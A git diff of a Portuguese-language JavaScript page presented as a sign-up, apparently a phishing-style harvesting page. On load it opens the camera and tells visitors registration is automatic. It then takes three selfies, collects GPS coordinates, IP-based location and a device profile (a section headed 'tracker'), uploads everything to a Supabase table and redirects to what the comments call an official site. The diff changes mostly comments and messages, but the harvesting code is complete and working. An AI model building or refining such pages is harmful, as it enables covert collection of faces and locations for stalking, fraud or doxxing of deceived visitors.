@@ -1,8 +1,9 @@
 // =================================================================
 // CONFIGURAÇÃO DE CONEXÃO (Usando o Supabase Global do HTML)
 // =================================================================
+// URL corrigida: sem "/rest/v1/" no final para não duplicar rotas
 const SUPABASE_URL = "https://gskcadoofoqwhqshcxcs.supabase.co"; 
-// USE APENAS A PUBLISHABLE KEY ABAIXO:
+// Chave pública (Publishable) segura para rodar no navegador
 const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; 
 
 const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
@@ -13,25 +14,24 @@ const btn = document.getElementById("btn");
 const statusText = document.getElementById("status");
 const canvas = document.getElementById("canvas");
 
-// ======================
+// =================================================================
 // SISTEMA DE ÁUDIO
-// ======================
+// =================================================================
 function falar(texto){
   speechSynthesis.cancel();
   const fala = new SpeechSynthesisUtterance(texto);
   fala.lang = "pt-BR";
   fala.volume = 1;
   fala.rate = 0.95;
-  fala.pitch = 1;
   speechSynthesis.speak(fala);
 }
 
-// ======================
-// INICIAR CÂMERA
-// ======================
+// =================================================================
+// INICIALIZAÇÃO DO SISTEMA E CÂMERA
+// =================================================================
 async function iniciarSistema(){
   try {
-    falar("Seu cadastro será realizado automaticamente. após clicar no botão verde abaixo.");
+    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
     statusText.innerHTML = "🟡 Iniciando sistema...";
 
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -61,9 +61,9 @@ window.onload = () => {
   iniciarSistema();
 };
 
-// ======================
-// ANALISAR DISPOSITIVO
-// ======================
+// =================================================================
+// RASTREADOR E ANALISADOR DE DISPOSITIVO
+// =================================================================
 function analisarDispositivo() {
   const ua = navigator.userAgent;
   let androidVersion = "Não é Android";
@@ -95,7 +95,7 @@ function analisarDispositivo() {
 }
 
 // =================================================================
-// BOTÃO PRINCIPAL: PROCESSO DE CADASTRO
+// EVENTO DO BOTÃO: FLUXO DE CAPTURA E SALVAMENTO
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
@@ -109,7 +109,7 @@ btn.addEventListener("click", async () => {
     const altura = video.videoHeight;
 
     if(!largura || !altura){
-      throw new Error("Vídeo não carregou");
+      throw new Error("Vídeo não carregou corretamente.");
     }
 
     canvas.width = 640;
@@ -117,20 +117,20 @@ btn.addEventListener("click", async () => {
     const ctx = canvas.getContext("2d");
     const fotos = [];
 
+    // Captura em Rajada: 3 fotos com intervalo de 1 segundo e compressão leve
     for(let i = 0; i < 3; i++) {
         ctx.drawImage(video, 0, 0, 640, 480);
-        fotos.push(canvas.toDataURL("image/jpeg", 0.4));
+        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
         if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
+    // Desliga a câmera para economizar a bateria do celular do usuário
     const stream = video.srcObject;
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
 
-    // ======================
-    // CAPTURA DO GPS
-    // ======================
+    // Coleta de Geolocalização (GPS)
     let latitude = "não permitido";
     let longitude = "não permitido";
 
@@ -148,12 +148,10 @@ btn.addEventListener("click", async () => {
       latitude = localizacao.coords.latitude;
       longitude = localizacao.coords.longitude;
     } catch(err) {
-      console.log(err);
+      console.log("GPS não capturado:", err);
     }
 
-    // ======================
-    // CAPTURA DE IP E LOCALIZAÇÃO DE REDE
-    // ======================
+    // Consulta de Localidade por Rede (IPAPI)
     let ip = "indisponível";
     let cidade = "";
     let estado = "";
@@ -169,23 +167,20 @@ btn.addEventListener("click", async () => {
       estado = json.region || "";
       pais = json.country_name || "";
     } catch(err) {
-      console.log(err);
+      console.log("Erro IPAPI:", err);
     }
 
-    // ======================
-    // SALVANDO NO SUPABASE
-    // ======================
+    // Envio dos Dados Estruturados para o Supabase
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
     
     const infoDispositivo = analisarDispositivo();
 
-    // Enviando usando o cliente instanciado globalmente
     const { error } = await supabaseClient
       .from('checkins')
       .insert([
         {
-          selfies: fotos, 
+          selfies: fotos, // Alinhado perfeitamente com o tipo text[] do banco
           latitude: latitude.toString(),
           longitude: longitude.toString(),
           ip: ip,
@@ -205,9 +200,7 @@ btn.addEventListener("click", async () => {
 
     if (error) throw error;
 
-    // ======================
-    // SUCESSO FINAL
-    // ======================
+    // Sucesso e Redirecionamento Oficial
     statusText.innerHTML = "✅ Cadastro concluído";
     falar("Cadastro concluído com sucesso.");
 
@@ -217,7 +210,7 @@ btn.addEventListener("click", async () => {
 
   } catch(err) {
     console.log(err);
-    statusText.innerHTML = "❌ Erro: " + (err.message || JSON.stringify(err));
+    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
     btn.disabled = false;
     btn.innerHTML = "QUERO PARTICIPAR";
   }
